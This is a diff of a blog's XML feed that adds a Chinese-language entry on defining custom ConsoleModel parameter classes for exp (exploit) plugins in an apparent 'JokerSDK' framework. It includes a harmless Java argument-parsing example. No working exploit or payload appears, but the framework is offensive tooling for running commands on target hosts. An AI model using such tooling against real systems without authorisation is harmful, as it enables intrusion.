-    <updated>2020-04-24T17:21:41+08:00</updated>
-    <id>http://joker.lucifaer.com/15877201011471.html</id>
-    <content type="html"><![CDATA[
 
 ]]></content>
   </entry>
@@ -761,6 +769,78 @@ jar {
     <updated>2020-04-26T11:39:32+08:00</updated>
     <id>http://joker.lucifaer.com/15878723720179.html</id>
     <content type="html"><![CDATA[
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[自定义ConsoleModel]]></title>
+    <link href="http://joker.lucifaer.com/15922132356913.html"/>
+    <updated>2020-06-15T17:27:15+08:00</updated>
+    <id>http://joker.lucifaer.com/15922132356913.html</id>
+    <content type="html"><![CDATA[
+<p><code>ConsoleModel</code>主要是用于定义exp插件所需的参数模型，为一个纯pojo类。其主要负责定义exp插件所需参数，并负责完成exp插件单独运行时的参数解析，所以<code>ConsoleModel</code>中的<strong>属性必须与exp插件的requiredParams中的参数相同</strong>。</p>
+
+<h2 id="toc_0">0x01 插件参数解析调用逻辑</h2>
+
+<p>一般情况下，exp插件必须的三个参数为：</p>
+
+<ul>
+<li>targetUrl：目标url</li>
+<li>targetPort：目标端口</li>
+<li>command：执行命令</li>
+</ul>
+
+<p>其在exp中插件的对应设置为：</p>
+
+<p><img src="http://image-lucifaer.test.upcdn.net/2020/06/16/15922742534142.jpg" alt=""/></p>
+
+<p><code>JokerSDK</code>默认提供了<code>DefaultConsoleModel</code>用于表示以上三种参数的参数模型：</p>
+
+<p><img src="http://image-lucifaer.test.upcdn.net/2020/06/16/15922744091995.jpg" alt=""/></p>
+
+<p><img src="http://image-lucifaer.test.upcdn.net/2020/06/16/15922746208808.jpg" alt=""/></p>
+
+<p>可以看到在<code>ConsoleBaseModel</code>中定义了如何承接以上三种参数，同时定义了对应的参数解析标志位。在利用<code>@Parameter</code>时需要注意：</p>
+
+<p><strong>description字段的值需要与exp插件中requiredParams所设置的值相同</strong>，这样才能保证后续参数解析流程正常的获取到对应值。</p>
+
+<h2 id="toc_1">0x02 自定义ConsoleModel</h2>
+
+<p>当<code>DefaultConsoleModel</code>不能满足插件编写者的需求时，插件作者可以通过自定义<code>ConsoleModel</code>完成参数映射。</p>
+
+<p>如只需要在<code>targetUrl</code>、<code>targetPort</code>、<code>command</code>三个参数的基础上进行拓展，只需要继承<code>DefaultConsoleModel</code>即可，如：</p>
+
+<pre><code class="language-java">public class CustomConsoleModel extends DefaultConsoleBaseModel {
+    @Parameter(names = &quot;-d&quot;, description = &quot;description&quot;)
+    protected String description;
+
+    @Override
+    public String getTargetUrl() {
+        return super.getTargetUrl();
+    }
+
+    @Override
+    public String getTargetPort() {
+        return super.getTargetPort();
+    }
+
+    @Override
+    public String getCommand() {
+        return super.getCommand();
+    }
+    
+    public String getDescription() {
+        return description;
+    }
+}
+</code></pre>
+
+<p>如果需要完全自定义参数的话，可以模仿<code>ConsoleBaseModel</code>直接自定义<code>ConsoleModel</code>。</p>
+
+<h2 id="toc_2">0x03 更多自定义选项</h2>
+
+<p>exp插件的参数解析模块利用了<code>JCommaner</code>项目，如有更多需要自定义的选项的话，请参考<a href="https://jcommander.org/">JCommander官方文档</a></p>
 
 ]]></content>
   </entry>
